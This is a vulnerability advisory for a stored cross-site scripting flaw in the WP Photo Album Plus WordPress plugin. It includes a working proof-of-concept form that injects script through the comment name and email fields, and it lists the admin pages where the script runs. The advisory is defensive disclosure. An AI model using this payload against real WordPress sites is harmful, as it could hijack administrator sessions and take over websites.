Advisory Details:

High-Tech Bridge Security Research Lab discovered stored XSS vulnerability in WP Photo Album Plus WordPress plugin, which can be exploited to perform Cross-Site Scripting attacks against administrators of vulnerable WordPress installation. An attacker might be able to hijack administrator’s session and obtain full control over the vulnerable website.

The vulnerability exists due to the absence of filtration of user-supplied input passed via the "comname" and "comemail" HTTP POST parameters to "/wp-content/plugins/wp-photo-album-plus/wppa-ajax-front.php" script when posting a comment. 

A remote attacker can post a specially crafted message containing malicious HTML or script code and execute it in administrator’s browser in context of the vulnerable website, when administrator views images or comments in administrative interface. 

A simple exploit below will store JS code in the WP database and display a JS popup window with "ImmuniWeb" word every time the administrator views comments or images:


<form action="http://[host]/wp-content/plugins/wp-photo-album-plus/wppa-ajax-front.php" method="post" name="main">
<input type="hidden" name="action"  value='wppa'>
<input type="hidden" name="wppa-action"  value='do-comment'>
<input type="hidden" name="photo-id"  value='2'>
<input type="hidden" name="comment"  value='1'>
<input type="hidden" name="moccur"  value='1'>
<input type="hidden" name="comemail"  value='"><script>alert(/ImmuniWeb/);</script>'>
<input type="hidden" name="comname"  value='"><script>alert(/ImmuniWeb/);</script>'>
<input type="submit" id="btn">
</form>


The code will be automatically executed, when the administrator visits one of the following pages:

http://[host]/wp-admin/admin.php?page=wppa_manage_comments
http://[host]/wp-admin/admin.php?page=wppa_moderate_photos
